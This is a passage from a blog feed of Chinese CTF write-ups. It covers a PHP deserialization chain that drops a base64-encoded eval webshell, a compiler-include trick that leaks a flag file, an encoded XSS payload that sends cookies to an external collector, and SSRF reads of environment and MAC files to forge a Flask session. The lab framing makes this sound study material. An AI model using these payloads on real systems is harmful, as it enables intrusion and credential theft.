punctuation">&#123;</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// åˆ›å»ºå¤±è´¥</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//æ•°æ®å‹ç¼©</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php\n//"</span> <span class="token operator">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n exit();?>\n"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>çœ‹äº†çœ¼ä»£ç ï¼Œè¿™ä¸æ˜¯å’Œä¹‹å‰é‚£ä¸ªä¸€æ ·å—ã€‚æ­£å¥½å†åšä¸€éçœ‹ä¼šäº†æ²¡ã€‚</p><p>å…·ä½“è§<a href="https://syunaht.com/p/286731300.html">åˆ·é¢˜ç¬”è®°:[EIS 2019]EzPOP</a></p><p>ä¸è¿‡åœ¨è¿™é‡Œæœ‰ä¸ä¸€æ ·çš„åœ°æ–¹ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-1/image-20210824140935138.png"></p><p>æ‰€ä»¥å¾—ç»•è¿‡</p><p>ä¸€å¼€å§‹æƒ³çš„æ˜¯æ¢ä¸ªåç¼€</p><p><strong>phpåç¼€</strong>:php3,php4,php5,phtml,pht</p><p>ç»“æœéƒ½ä¸èƒ½è¢«å½“åšphpè§£æï¼Œæ‰€ä»¥å¦å¯»ä»–æ³•ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;..&#x2F;shell.php&#x2F;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span>  <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/../shell.php/."</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"YWFhUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ=="</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"base64_decode"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[FireshellCTF2020]Caas</title>
      <link href="/p/1884635343.html"/>
      <url>/p/1884635343.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FireshellCTF2020-Caas/image-20210822181033264.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å°è¯•æ€§çš„è¾“å…¥Cä»£ç ï¼Œè¿”å›äº†ä¸ªç¼–è¯‘æ–‡ä»¶</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FireshellCTF2020-Caas/image-20210822212904064.png"></p><p>è¾“å…¥</p><pre class="line-numbers language-none"><code class="language-none">#include &quot;&#x2F;flag&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨æŠ¥é”™æ‹¿åˆ°flagã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FireshellCTF2020-Caas/image-20210822212949054.png"></p><p>æ„Ÿè§‰å°±åƒåœ¨ç©è„‘ç­‹æ€¥è½¬å¼¯</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</title>
      <link href="/p/563486977.html"/>
      <url>/p/563486977.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821210439499.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç»™äº†<a href="http://xss.buuoj.cn/">xsså¹³å°</a>ï¼Œæ˜ç¤ºè¿™é¢˜æ˜¯xssäº†ã€‚</p><p>è¿™ç§æªè¾ï¼Œæš—ç¤ºäº†æ˜¯xssã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821221720295.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821220920830.png"></p><p>æŠ•ç¥¨é‡Œçš„è‹±æ–‡å•å¼•å·ä¼šå˜æˆä¸­æ–‡å•å¼•å·</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821210508698.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821213425074.png"></p><p>å…ˆåˆ°xsså¹³å°æ‹¿xssä»£ç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821224003146.png"></p><p>ç„¶åä½¿ç”¨<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">HTML Markup</a>è¿›è¡Œè½¬ç ç»•è¿‡</p><p><code>(new Image()).src</code>æ”¹ä¸º<code>window.location.href</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">'''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=gHkxCN&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>    output <span class="token operator">+=</span> <span class="token string">"&amp;#"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;svg>&lt;script>eval&amp;#40&amp;#34"</span> <span class="token operator">+</span> output <span class="token operator">+</span> <span class="token string">"&amp;#34&amp;#41&lt;/script>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#61&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#120&amp;#115&amp;#115&amp;#46&amp;#98&amp;#117&amp;#117&amp;#111&amp;#106&amp;#46&amp;#99&amp;#110&amp;#47&amp;#105&amp;#110&amp;#100&amp;#101&amp;#120&amp;#46&amp;#112&amp;#104&amp;#112&amp;#63&amp;#100&amp;#111&amp;#61&amp;#97&amp;#112&amp;#105&amp;#38&amp;#105&amp;#100&amp;#61&amp;#103&amp;#72&amp;#107&amp;#120&amp;#67&amp;#78&amp;#38&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#116&amp;#111&amp;#112&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#116&amp;#111&amp;#112&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#40&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#32&amp;#38&amp;#38&amp;#32&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#41&amp;#63&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#58&amp;#39&amp;#39&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#59&amp;#125&amp;#41&amp;#40&amp;#41&amp;#59&amp;#34&amp;#41&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”Ÿæˆçš„payloadæ‰“è¿›å»ï¼Œå‘ç°é¡µé¢è‡ªåŠ¨è·³è½¬ï¼Œè¯´æ˜æœ‰æ•ˆ</p><p>é¡µé¢åœ°å€</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;3ab0873a-a1d0-455d-a996-07620bdb753e.node4.buuoj.cn:81&#x2F;post&#x2F;3eb90a2d54bdfadfcfafe59834b8e26a.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éœ€è¦æ”¹ä¸º</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;web.node4.buuoj.cn:81&#x2F;post&#x2F;3eb90a2d54bdfadfcfafe59834b8e26a.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ”¾åˆ°è¿™é‡Œï¼Œç„¶åè·‘ä¸€ä¸‹md5</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821224622133.png"></p><p>ä¹‹å‰å•çº¿ç¨‹è„šæœ¬å¤ªæ…¢äº†ï¼Œå†™äº†ä¸ªå¤šçº¿ç¨‹çš„è„šæœ¬è·‘ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210822004536074.png"></p><p>è¯•äº†å¾ˆä¹…ï¼Œxsséƒ½æ²¡è§¦å‘ï¼Œç´¯äº†ï¼Œæ˜å¤©å†åšå§</p><p>ç¬¬äºŒå¤©åˆè¯•äº†ä¸‹ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæ— è¯­äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CISCN2019 åä¸œå—èµ›åŒº]Web4</title>
      <link href="/p/358833585.html"/>
      <url>/p/358833585.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[flask|uuid.getnode|ç½‘å¡|MAC|session]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821171753058.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ„Ÿè§‰åƒæ˜¯SSRF</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821171813290.png"></p><p>fileæç¤ºç›´æ¥hack</p><p>dictå’Œgopheræ²¡æç¤º</p><p>å¯ä»¥è¯»å–æ–‡ä»¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821180857549.png"></p><p>è¯»å–/proc/self/environ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821195311382.png"></p><p>è¯»/app/app.py</p><p>çœ‹æ¥éœ€è¦æ„é€ session</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821200209222.png"></p><p>æ„é€ sessionéœ€è¦æ‹¿åˆ°keyï¼Œè€Œkeyæ˜¯ç”±éšæœºç”Ÿæˆçš„ï¼Œé‚£æ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•æ‹¿åˆ°éšæœºç§å­ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821200938155.png"></p><p>è€Œ<code>uuid.getnode()</code>è·å–çš„æ˜¯ç½‘å¡MACåœ°å€çš„åè¿›åˆ¶æ•°ï¼Œéœ€è¦è¯»å–<code>/sys/class/net/eth0/address</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821202127531.png"></p><pre class="line-numbers language-none"><code class="language-none">02:42:ac:10:b8:1e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è½¬æ¢æˆåè¿›åˆ¶æ•°ï¼Œ6*8=48bit</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mac <span class="token operator">=</span> <span class="token string">"02:42:ac:10:b9:08"</span>temp <span class="token operator">=</span> mac<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token 